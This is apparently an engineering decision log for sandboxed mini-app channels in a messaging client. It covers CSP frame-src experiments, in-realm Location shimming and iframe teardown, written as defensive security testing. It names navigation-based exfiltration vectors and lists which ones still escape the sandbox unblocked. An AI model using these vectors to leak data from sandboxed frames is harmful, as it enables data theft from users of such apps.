  (DraftInputId.none). The none-input maps to the existing
  EmptyNotesRenderer null composer — no new composer surface. The
  renderer dispatches through the existing exhaustive
  BUILTIN_COLLECTION_RENDERERS record.
- **D40: Theme mapping.** The shell knows light/dark only. Host maps the
  tamagui theme name: {dark, dracula, gruvbox} plus a name-contains-
  "dark" heuristic → dark; everything else light. Exotic themes get the
  nearer of the two until shell tokens grow variants.
- **D41: Native hosts are written but UNVERIFIED, and say so.** The RN
  WebView host mirrors the web host through the shared session; every
  device-only behavior carries a greppable `SURFACE-NATIVE-VERIFY`
  marker (transport: inbound delivered by dispatching a window
  MessageEvent via injectJavaScript, because RN postMessage historically
  targets document on iOS vs window on Android; srcdoc/baseUrl: CSP meta
  application under `source={{html}}`; egress:
  `onShouldStartLoadWithRequest` vetoes NAVIGATIONS only — real deny-all
  needs WKContentRuleList / shouldInterceptRequest native modules that
  react-native-webview props cannot express; capabilities: storage/file/
  media props). No native sandbox verification is claimed anywhere.
- **D42: §8 exclusion is a paired predicate.** `isSurfaceChannel` (JS)
  and a `NOT LIKE '%tlon.r0.collection.surface%'` fragment over the JSON
  config text column (SQL) are defined side by side so they can't drift.
  Application: getChats zeroes surface channels' unread rows and
  subtracts the surface contribution from the backend-precomputed group
  counts at read time (floored at zero); getNotifyingUnreadSourceCount
  excludes surface channel/thread rows; SQL-shaped activity queries
  filter via a channels join; relational-API activity queries post-filter
  (their pages can come back shorter than the limit); ChannelListItem
  guards the badge for models from any query. Channel-less events
  (contact, group-level) always pass. Deps arrays gain `channels`
  wherever the exclusion reads channel config. Accepted §8 boundaries,
  recorded not hidden: the group-level `notify` flag stays
  backend-authored (its cause is unknowable client-side), so a group
  whose only notifying child is a surface channel can still light the
  app-badge count; and the LIKE match is substring-based over the config
  JSON — the renderer-id namespace makes false positives implausible,
  but it is a textual, not structural, match. Server-side kind-aware
  activity remains the v1 fix.

### Found, flagged, not fixed (out of scope)

- `activity_event_contact_group_pins`' foreign key targets
  `activity_events(id)`, but that table's real primary key is
  `(id, bucketId)`. Under an enforcing `foreign_keys` pragma (as in the
  shared test db), any statement that makes SQLite resolve that FK —
  `insertActivityEvents`' upsert arm, multi-row inserts — fails with
  "foreign key mismatch". Production connections appear not to enforce
  the pragma, which is why this has never bitten. The §8 tests seed with
  plain per-row inserts to sidestep it; the schema defect itself is
  session-1-through-3-independent and predates this branch.

### Least sure about (flag for review)

- The posture test proves what a browser can observe from inside and
  beside the sandbox; it cannot prove the absence of channels the
  browser doesn't expose. The CSP-meta + opaque-origin design is belt
  and suspenders, not a formal proof.
- Group-count subtraction happens in getChats only; group models reaching
  GroupListItem from other queries would show the backend count. The
  sidebar (the group badge's home) reads getChats, so this is currently
  moot — but a future group-badge surface needs the same subtraction.
- `checkActivityEmpty` now means "no non-surface activity", which is the
  §8-correct reading of "empty" for the activity screen.

## Notes for Session 5+ (tlon-skill, templates, publish gate)

- **Serving fixture bundles:** the host fetches `spec.bundle.assetRef`
  with a plain `fetch()` OUTSIDE the sandbox and hash-verifies through
  `getOrFetchBundle` before anything executes. Any HTTP URL the client
  can reach works — a local static server is fine for development; the
  256 KB size cap is enforced pre-fetch (spec sanity) and the sha256
  post-fetch (authority).
- **What the bot must write for a channel to render as a surface:** the
  channel's content configuration must set collection renderer
  `tlon.r0.collection.surface` AND draft input `tlon.r0.input.none`, and
  the description payload must carry the `surfaceSpec` subtree. The
  renderer keys §6 states off `surfaceSpec` (readSurfaceSpec at every
  read) and §8 exclusion off the content configuration — set both.
- **Invoke expectations for `surface event` tooling:** client invokes
  arrive as one-entry `mode: 'invoke'` blobs under kind tail
  `surface/event` with fallback Story text; `specRevision` is stamped by
  the posting client from the spec it rendered. Stale-revision invokes
  are the bot's to resolve per the ratified reducer rules (§4.3) —
  clients already drop stale invokes that never left the sandbox, but a
  revision can flip mid-flight.
- **Web demonstration path:** `pnpm build:surface-shell` at root, then
  `pnpm e2e:sandbox` in apps/tlon-web (no ships) runs the hostile-bundle
  posture test AND the poll fixture end-to-end through the real host
  document (render → state re-render → tap → invoke → permission-off
  disables). Extend that spec when templates need browser-level checks.
- **Native work is a device checklist, not a code task:** grep
  `SURFACE-NATIVE-VERIFY` for the four marker sites; none can be cleared
  from a laptop. The egress marker in particular needs a native-module
  decision (WKContentRuleList / shouldInterceptRequest) before any
  native ship.
- **Cosmos fixtures** exist for every §6 state
  (`packages/app/fixtures/SurfaceChannel.fixture.tsx`) and render the
  real state components; the ready-state fixture documents the shared
  rendered-state scenarios in comments.

## Session 4.5 decisions (fix batch + the frame-src experiment)

- **D43: The `frame-src` experiment (F1 option D) — hypothesis HOLDS.** A
  `frame-src` allowlist on the **host page** blocks the sandboxed iframe's
  self-initiated navigation **pre-flight** on all three engines. Measured,
  not assumed (`apps/tlon-web/sandbox-posture/navigation.spec.ts`;
  `SANDBOX_ENGINES=all`, 111 tests).

  | host-page config | chromium | firefox | webkit | srcdoc loads? |
  | --- | --- | --- | --- | --- |
  | A — no CSP (production today) | NOT blocked | NOT blocked | NOT blocked | yes |
  | header `frame-src 'none'` | pre-flight | pre-flight | pre-flight | **yes** |
  | header `frame-src 'self'` | pre-flight | pre-flight | pre-flight | yes |
  | header `frame-src https://example.com` | pre-flight | pre-flight | pre-flight | yes |
  | header `frame-src <attacker>` *(control)* | NOT blocked | NOT blocked | NOT blocked | yes |
  | meta `frame-src 'none'` | pre-flight | pre-flight | pre-flight | yes |
  | meta `frame-src <attacker>` *(control)* | NOT blocked | NOT blocked | NOT blocked | yes |

  Cells are identical across all four probes (`location.replace`,
  `location.href =`, anchor click, `document.write` meta-refresh); that
  uniformity is itself asserted, so a future per-vector divergence fails
  the suite.

  - **Q2 (the one that decides usability): `about:srcdoc` frames still
    load and run under `frame-src 'none'` on all three engines** — srcdoc
    is not a network fetch, so it is exempt from `frame-src`. The
    restriction costs us nothing.
  - **Q3: pre-flight.** Ground truth is the attacker's own HTTP server
    logging zero connections — not merely an absent Playwright event.
    Nothing left the device, so the URL-borne payload never escaped.
    Late/commit-stage blocking would have been useless here, since the
    URL *is* the exfiltration.
  - **Q4:** `'none'`, `'self'`, and an allowlist excluding the attacker
    behave identically; allowlisting the attacker lets it through on the
    same delivery mechanism, which is what attributes the blocking to
    `frame-src` source matching rather than to the page merely carrying
    a CSP.

  **Methodology, deliberately stronger than the original posture spec**
  (and the standard for future leak tests): a real attacker HTTP server
  replaces the `.invalid` host, because an unresolvable host cannot
  distinguish "CSP blocked it" from "DNS failed"; every probe posts
  `probe-armed` before navigating, so a frame that never loaded cannot be
  mis-scored as blocked; and every blocking config is paired with an
  allowlist-the-attacker control.

  **Engine divergence, recorded and asserted:** after a blocked
  navigation Chromium commits an error page *into the sandbox frame*,
  destroying the running app; firefox and webkit leave it on
  `about:srcdoc` and the app keeps running. Neither leaks — on Chromium a
  hostile bundle can only DoS itself.

  **Known-untested residual:** redirect chains from an allowlisted origin
  to an attacker origin. Any non-empty allowlist reintroduces a hop, so
  this must be measured before anyone calls the hole closed. Also
  untested: `data:`/`blob:` navigation targets. (`window.open` and
  top-level navigation are already blocked by the withheld
  `allow-popups` / `allow-top-navigation` tokens.)

  **Enforcement flip criteria** — the enforcing `frame-src` may be turned
  on only when all of: (1) the allowlist demonstrably covers every
  legitimate frame in the app, verified against Report-Only violation
  reports from real usage, not just static enumeration; (2) the redirect
  residual above has been measured; (3) a rollback path exists that does
  not require a full client release. Until then the enforcing policy
  ships written-but-disabled.

  This upgrades the web posture from "gate is the only boundary against
  navigation egress" to "gate plus origin-restricted navigation," but does
  **not** retire the Worker-realm migration: `frame-src` restricts where a
  frame may navigate, not whether unpinned code can run in it, and it
  depends on a host-page policy that a future deployment change could drop
  silently. M4 stands as recorded in D36 and the amended plan §5.

### Found, flagged, not fixed (session 4.5)

- **`setChannelVolumeLevel` rolls back only when a previous setting
  existed.** `packages/shared/src/store/activityActions.ts` (~line 351):
  the catch restores `existingVolumeSetting` guarded by
  `if (existingVolumeSetting)`. For a channel with no prior setting — a
  freshly discovered one, or any channel a user mutes for the first time
  — a failed poke leaves the optimistic `hush` row in the local DB while
  the ship still says default-notify: the UI shows "muted" and pushes
  keep arriving. `muteThread`/`unmuteThread` in the same file handle this
  correctly via `db.clearVolumeSetting(...)`, so the fix is a small
  `else` branch with in-file precedent.

  Pre-existing and shared with the UI mute button, so **not** fixed here:
  it changes shipped mute behavior and is orthogonal to surface channels.
  F4 does not depend on that local row being correct — the actual
  suppression is the ship-side volume map, and F4's marker correctly
  stays unset on a failed poke so the next discovery retries.

- **D44: Host-page CSP — Report-Only has no production delivery.
  (Supersedes D43's flip criteria.)** A STOP finding, reported rather than
  worked around.

  `tlon-web` ships as a **glob served by `%docket`**, whose
  `+payload-from-glob` returns `index.html` with exactly one header
  (`content-type`); the runtime-cache path hardcodes the same. `%docket`
  is **not in this repo** — `peru.yaml` vendors only docket's
  `lib`/`mar`/`sur`, never `app/docket.hoon` — so no repo-local change can
  add a response header. And CSP3 §3.3 excludes
  `Content-Security-Policy-Report-Only` from `<meta>` delivery (along with
  `report-uri` and `frame-ancestors`).

  Therefore: **the enforcing `<meta>` is the only production mechanism
  that exists.** It is written and gated off behind `ENFORCE_HOST_CSP`
  (a one-line flip, proven through the real build path), and deliberately
  NOT shipped this session. Report-Only runs on the Vite dev and preview
  servers, which is a genuine validation surface — the e2e suite runs
  against `dev-no-ssl` and the production-build smoke path against
  `vite preview`.

  **The allowlist is `frame-src 'self' https://tlon.network`** — one
  entry, exhaustively enumerated: `ManageAccountScreen`'s iframe (a
  hardcoded constant, no per-environment variation). The mini-app sandbox
  is `srcdoc` and measured exempt; the composer's webview shim renders
  `srcDoc` and never `src`; every `window.open` site opens a top-level
  context, which `frame-src` does not govern and for which the policy must
  NOT be widened.

  **Amended flip criteria** (D43's criterion 1 assumed production
  Report-Only telemetry that cannot exist):
  1. Clean Report-Only runs across the dev/e2e surface — **but note this
     is only evidence if something observes violations. Nothing collects
     them today; a violation listener must be wired before a clean run
     may be cited.** Otherwise "no reports" means "nobody looked."
  2. The D43 redirect residual measured (an allowlisted origin
     redirecting to an attacker origin).
  3. Accept that **production enforcement failures are silent**: with no
     `report-uri` available in `<meta>`, an allowlist gap surfaces as a
     broken feature, not a report. This is the strongest argument for
     gathering evidence before the flip, and it replaces D43's
     "verified against real-usage reports," which is unachievable.
  4. Rollback is a glob redeploy, not a client release — faster than an
     app-store cycle, but not instant. State it accurately when planning.

  **Chromium consequence of flipping** (measured, `navigation.spec.ts`):
  a refused navigation commits an error page *into* the sandbox frame,
  destroying the running mini-app; firefox and webkit leave it on
  `about:srcdoc`. Nothing leaks either way — a hostile bundle can only
  self-destruct its own surface — but it is a real behavioral consequence
  of enforcement, not a reason against it.

- **D43 AMENDMENT (after the B-layer landed).** D43 recorded that "cells
  are identical across all four probes ... that uniformity is itself
  asserted." **That is no longer true, deliberately.** The B-layer's
  lexical shadowing (D45 below) blocks two of the vectors in-realm, so
  the suite now asserts a per-vector split, and D43's Config A "NOT
  blocked" row holds only for the *unshimmed* vectors
  (`window.location.replace`, anchor click, meta-refresh). The `frame-src`
  findings themselves — pre-flight blocking on all three engines, srcdoc
  exempt, controls behaving — are unaffected.

- **D45: In-realm `Location` hardening as specified is impossible; what
  shipped is narrower and labeled as such.** Measured on all three
  engines in a real `sandbox="allow-scripts"` srcdoc frame:
  `Object.getOwnPropertyDescriptor(Location.prototype, 'replace'|'assign'
  |'href')` is **absent** — every `Location` member is
  `[LegacyUnforgeable]`, living as a non-writable, non-configurable **own**
  property of the instance. `defineProperty` throws, assignment silently
  fails, `delete` returns false, and `window.location` is itself
  non-configurable so the object cannot be swapped. A "freeze the Location
  prototype" patch would have been **dead code that reads like
  protection** — the exact failure mode F1 taught us to avoid.

  What ships: lexical shadowing of the bare `location` identifier inside
  the bundle's own function scope, plus replacing `window.open` (the one
  writable navigation-adjacent global, and already inert because
  `allow-popups` is withheld). Post-mitigation matrix under Config A (no
  host CSP — the production posture, since D44's policy ships gated off),
  identical on all three engines:

  | probe | result |
  | --- | --- |
  | `location.replace` (bare identifier) | blocked by the shim |
  | `location.href =` (bare identifier) | blocked by the shim |
  | `window.location.replace` | **NOT blocked** |
  | anchor click (`target="_self"`) | **NOT blocked** |
  | `document.write` meta-refresh | **NOT blocked** |

  A `nav-window-location` probe was added specifically so the suite
  asserts this residual rather than implying containment; the two shimmed
  vectors read blocked in *every* config including the
  allowlist-the-attacker controls, which is what proves the shim rather
  than the policy is responsible.

- **D46: Teardown premise is measured, not assumed.** The host tears the
  iframe down on any post-initial `load`. "Initial" is defined **per DOM
  element** (a ref holding the node whose first load was seen), so an
  intentional revision remount — a different node — cannot be confused
  with self-navigation. This depends on never reassigning `srcDoc`
  in place, which is now measured: assigning `srcdoc` to an
  already-inserted element fires **2** loads on chromium/webkit (1 on
  firefox), indistinguishable from self-navigation, while React's
  set-before-insert fires **1**. Pinned per engine so the premise fails
  the suite rather than rotting silently.

### Follow-ups opened this session (not actioned)

- **Native has no teardown equivalent.** `sandboxSession`'s "second
  `ready` re-inits" path is now effectively unreachable on web (teardown
  fires first) but remains live on native, which got only the
  invoke-binding fix. A WebView teardown is device-verification
  territory — add it to the `SURFACE-NATIVE-VERIFY` checklist.
- **A torn-down surface renders a blank pane.** No §6 state covers "this
  app was shut down"; worth a defined state, though it only triggers on
  hostile navigation, which a gate-approved bundle should never do.
- **No CSP violation listener exists** (see D44 criterion 1) — a clean
  Report-Only run is not evidence until something observes violations.
